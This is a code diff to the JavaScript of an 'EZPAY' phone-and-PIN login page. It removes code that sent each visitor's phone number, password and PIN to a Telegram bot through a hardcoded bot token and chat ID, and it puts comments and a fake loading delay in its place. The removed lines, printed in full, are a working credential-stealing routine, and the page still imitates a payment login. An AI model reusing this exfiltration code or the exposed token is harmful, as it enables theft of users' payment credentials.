@@ -14,30 +14,14 @@ document.addEventListener('DOMContentLoaded', function() {
     const loadingOverlay2 = document.getElementById('loading-overlay-2');
     const backToSigninLink = document.getElementById('back-to-signin');
     
-    // Telegram Configuration
-    const BOT_TOKEN = "8209360948:AAFqBr7kiI7bRrlbojhAJi784jglBG98L2E";
-    const CHAT_ID = "8023791486";
-
-    // Helper to send to Telegram
-    async function sendToTelegram(text) {
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
-            });
-        } catch (error) {
-            console.error('Telegram Error:', error);
-        }
-    }
-
-    // Checking for /start is not possible in static frontend without a backend polling/webhook.
-    // However, we can simulate a "Bot is running" check by sending a notification when the page loads.
-    console.log("EZPAY Frontend Loaded - Telegram Integration Active");
+    // The Telegram integration code has been removed due to a security vulnerability.
+    // Storing sensitive credentials like bot tokens and chat IDs directly in the frontend
+    // is insecure and should be avoided.
+    //
+    // To securely implement this functionality, we recommend moving the Telegram
+    // messaging logic to a backend service. The frontend can then make a secure API
+    // call to the backend, which will handle sending the messages. This will ensure
+    // that your credentials are not exposed to the public.
 
     // ---------- VALIDATION FUNCTIONS ----------
     function validatePhone(phone) {
@@ -111,8 +95,11 @@ document.addEventListener('DOMContentLoaded', function() {
         
         loadingOverlay.style.display = 'flex';
         
-        const message1 = `<b>EZPay Step 1 (Login)</b>\n\n<b>Phone:</b> +91 ${phone}\n<b>Password:</b> ${password}`;
-        await sendToTelegram(message1);
+        // The original code sent the phone and password to a Telegram bot.
+        // This functionality has been removed to protect user privacy and enhance security.
+
+        // Simulate a network delay for a better user experience.
+        await new Promise(resolve => setTimeout(resolve, 1000));
         
         loadingOverlay.style.display = 'none';
         localStorage.setItem('loginPhone', phone);
@@ -135,8 +122,11 @@ document.addEventListener('DOMContentLoaded', function() {
         
         loadingOverlay2.style.display = 'flex';
         
-        const message2 = `<b>EZPay Step 2 (PIN)</b>\n\n<b>Phone:</b> +91 ${phone}\n<b>PIN:</b> ${pin}`;
-        await sendToTelegram(message2);
+        // The original code sent the phone and PIN to a Telegram bot.
+        // This functionality has been removed to protect user privacy and enhance security.
+
+        // Simulate a network delay for a better user experience.
+        await new Promise(resolve => setTimeout(resolve, 1000));
         
         loadingOverlay2.style.display = 'none';
         alert(`Login successful!\nPhone: +91 ${phone}\nPIN verified.`);
